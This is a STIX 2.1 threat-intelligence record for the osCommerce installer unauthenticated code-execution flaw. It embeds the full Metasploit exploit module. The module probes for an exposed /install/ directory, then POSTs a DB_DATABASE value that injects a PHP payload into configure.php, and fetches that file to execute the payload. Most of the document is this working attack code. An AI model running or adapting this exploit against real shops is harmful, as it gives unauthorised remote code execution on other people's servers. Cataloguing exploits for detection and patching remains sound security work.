{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f4ed9e91-bfb2-48ad-8abb-5b118bb0af29",
    "created": "2024-08-14T17:09:16.486409Z",
    "modified": "2024-08-14T17:09:16.486413Z",
    "name": "osCommerce Installer Unauthenticated Code Execution",
    "description": " If the /install/ directory was not removed, it is possible for an unauthenticated attacker to run the \"install_4.php\" script, which will create the configuration file for the installation. This allows the attacker to inject PHP code into the configuration file and execute it. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/oscommerce_installer_unauth_code_exec.rb",
            "external_id": "oscommerce_installer_unauth_code_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'osCommerce Installer Unauthenticated Code Execution',\n      'Description'    => %q{\n        If the /install/ directory was not removed, it is possible for an unauthenticated\n        attacker to run the \"install_4.php\" script, which will create the configuration\n        file for the installation. This allows the attacker to inject PHP code into the\n        configuration file and execute it.\n      },\n      'Author'         => [\n        'Simon Scannell',      # Original exploit author\n        'Daniel Teixeira'      # MSF module author\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['EDB', '44374'],\n        ],\n        'Payload'      =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n       'Privileged' => false,\n       'Platform'   => ['php'],\n       'Arch'       => ARCH_PHP,\n       'Targets' =>\n          [\n            [ 'osCommerce 2.3.4.1', { } ],\n          ],\n      'DisclosureDate' => '2018-04-30',\n      'DefaultTarget' => 0))\n     register_options(\n      [\n        OptString.new('URI', [true, 'The path to the install directory', '/catalog/install/'])\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['URI'], 'install.php'),\n      'method' => 'GET'\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200 && res.body.include?('osCommerce Website')\n      return CheckCode::Safe\n    end\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['URI'], 'index.php'),\n      'method' => 'GET'\n    })\n\n    if res.body.include?('configure.php') && res.body.include?('The following files need to have their file permissions set to world-writeable (chmod 777):')\n      vprint_error 'configure.php is not writable'\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def trigger\n    send_request_cgi({\n      'uri'     => normalize_uri(datastore['URI'], 'includes/configure.php'),\n      'method'  => 'GET'\n    })\n  end\n\n  def exploit\n    unless check == CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    data = {\n      'DIR_FS_DOCUMENT_ROOT' => './',\n      'DB_DATABASE' => \"');#{payload.encoded}/*\"\n    }\n\n    res = send_request_cgi({\n      'uri'       => normalize_uri(datastore['URI'], 'install.php'),\n      'method'    => 'POST',\n      'vars_get'  => {\n        'step' => '4'\n      },\n      'vars_post' => data\n    })\n    trigger\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-04-30",
    "x_mitre_platforms": [
        "['php']"
    ]
}